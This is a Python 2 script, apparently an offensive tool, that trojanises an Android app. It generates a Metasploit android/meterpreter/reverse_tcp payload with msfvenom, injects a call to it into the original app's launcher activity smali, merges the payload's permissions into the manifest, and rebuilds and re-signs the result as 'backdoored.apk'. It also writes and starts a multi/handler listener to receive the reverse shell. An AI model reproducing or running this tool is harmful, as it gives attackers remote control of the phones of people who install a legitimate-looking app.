#!/usr/bin/python2
import subprocess
import argparse
import sys
import errno
import os
import shutil

import xml.etree.ElementTree as ET

from apkhandling import builder, manifest_analyzer
from apkhandling import smali_converter

# tasks:
# - write/include argument parser
#   -> path to original apk             -o or --original
#   -> path to output dir               -out or --output
#   -> path to malware apk              -malware
#   -> or autogenerate meterpreter      -generate
#       -> parse given arguments for metasploit
#
#
# - check if jarsigner is installed
# - check if apktool is installed
# - check if metapsloit is installed but only if metasploit is also needed
# - method that generats metasploit payload
# - method that decompiles given apk
# - method that manipulates the manifest
# - method that injects the call to the malware into the original smali code
#   -> in future the starting point of the malware should be determined dynamic or given per parameters
#   -> think of different ways to launch the malware
# - method that copies malware smali into original smali files 
# - method that builds the apk again
# - method that signs the apk

# global dictonary for the arguments
args = {}


def parseArgs():
    global args
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("-o", "--original", action="store", dest="original_apk", default="")
    parser.add_argument("-m", "--malware", action="store", dest="malware_apk", default="")
    parser.add_argument("-out", "--output", action="store", dest="output_dir", default="")
    parser.add_argument("--meterpreter_ip", action="store", dest="meterpreter_ip", default="")
    parser.add_argument("--meterpreter_port", action="store", dest="meterpreter_port", default="")
    args_parsed = parser.parse_args(sys.argv[1:])

    # convert to dictonary
    args = vars(args_parsed)

    if args['meterpreter_port'] == "" or args['meterpreter_ip'] == "":
        args['metasploit_used'] = False
    else:
        args['metasploit_used'] = True
        # always android reverse shell and alway same output file
        args['meterpreter_arguments'] = "-p android/meterpreter/reverse_tcp LHOST=" + str(args['meterpreter_ip']) + \
                                        " LPORT=" + str(args['meterpreter_port']) + " -o payload.apk"


# checks if a given program is installed on the computer
# Returns True or False
def isInstalled(program):
    proc = subprocess.Popen(["which " + program], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    return out != ""


def generate_meterpreter(command):
    """ executes meterpreter with the options 
        given in the 'command' argument """
    proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()

    if "invalid" in out.lower() or \
            "error" in out.lower():
        print out
        sys.exit(1)

def start_meterpreter_handler():
    command = "ifconfig wlan0 | grep \"inet \" | awk -F'[: ]+' '{ print $4 }'"
    proc = subprocess.Popen(command, stdout=subprocess.PIPE,shell=True)
    (localip, err) = proc.communicate()
    print "[*] Start the handler for meterpreter on IP: " + str(localip) + " Port: " + args['meterpreter_port']
    with open("meterpreter_options.txt", "w") as f:
        f.write("use exploit/multi/handler\n")
        f.write("set payload android/meterpreter/reverse_tcp\n")
        f.write("set lhost " + str(localip) + "\n")
        f.write("set lport " + args['meterpreter_port'] + "\n")
        f.write("exploit\n")
    
    command = "msfconsole -r meterpreter_options.txt"
    proc = subprocess.Popen(command, shell=True)
    (out, err) = proc.communicate()



def run_jarsigner(command):
    """ executes the jarsigner with specific options 
        given in the 'command' argument"""
    full_command = "jarsigner " + command
    proc = subprocess.Popen(full_command, stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    print out
    print err


def main():
    global args

    parseArgs()
    print args
    start_meterpreter_handler()
    exit(1)

    # check for used programs
    if args['metasploit_used']:
        if not isInstalled("msfvenom"):
            print "[!] msfvenom (metasploit) is not installed, please install it and rerun the script"
            sys.exit(1)
    if not isInstalled("apktool"):
        print "[!] apktool is not installed, please install it and rerun the script"
        sys.exit(1)
    if not isInstalled("jarsigner"):
        print "[!] jarsigner is not installed, please install it and rerun the script"
        sys.exit(1)

    if not args['metasploit_used']:
        print "metasploit is required to run application, please specify the --meterprezer_ip and --meterpreter_port in the patameters"
        sys.exit(1)
    
    if not args['original_apk']:
        print "Please specify the path to the original apk with the -o parameter"
        sys.exit(1)

    print "[*] Generating msfvenom payload..\n"
    print "Metasploit command: msfvenom -f raw {} -o payload.apk 2>&1\n" \
        .format(args['meterpreter_arguments'])

    command = "msfvenom " + args['meterpreter_arguments'] + " 2>&1"
    print str(command)

    generate_meterpreter(command)

    print "[*] Signing payload..\n"
    run_jarsigner(
        "-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA payload.apk androiddebugkey")

    print "[*] Copy apk to desired place..\n"
    proc = subprocess.Popen("cp " + args['original_apk'] + " original.apk", stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    print out

    print "[*] Decompiling orignal APK..\n"
    builder.decompileApk("original.apk")
    print "[*] Decompiling payload APK..\n"
    builder.decompileApk("payload.apk")

    # read the manifest to xml model
    print "Reading android manifest"

    launcher_activity = manifest_analyzer.find_launcher_activity('original/_decompiled/AndroidManifest.xml')
    print "[*] Launcheractivity: {} ".format(launcher_activity[0])

    smali_file = 'original/_decompiled/smali/{}.smali'.format(launcher_activity[0].replace(".", "/"))

    print smali_file

    print "[*] Copying payload files..\n"
    hookedsmali = smali_converter.generate_hooked_smali(smali_file)
    print "[*] Loading ", smali_file, " and injecting payload..\n"

    with open(smali_file, "w") as f:
        f.write("\n".join(hookedsmali))
    injected_apk = "backdoored.apk"

    print "[*] Poisoning the manifest with meterpreter permissions..\n"
    payload_manifest = "payload/_decompiled/AndroidManifest.xml"
    original_manifest = "original/_decompiled/AndroidManifest.xml"
    manifest_analyzer.fix_manifest(payload_manifest, original_manifest, original_manifest)

    print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"

    builder.repackApk("original/_decompiled/")
    print "[*] Signing #{injected_apk} ..\n"

    run_jarsigner(
        "-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg "
        "MD5withRSA " + injected_apk + " androiddebugkey")

    # clean up
    print "[*] Clean up intermediate state ..\n"
    shutil.rmtree('original/')
    shutil.rmtree('payload/')

    os.remove("original.apk")
    os.remove("payload.apk")
    print "[+] Infected file " + injected_apk + " ready.\n"

     
    #if args['metasploit_used']:
    #    print "[*] Start the handler for meterpreter on IP: " + args['meterpreter_ip'] + " Port: " + args['meterpreter_port']
    #    start_meterpreter_handler()

main()
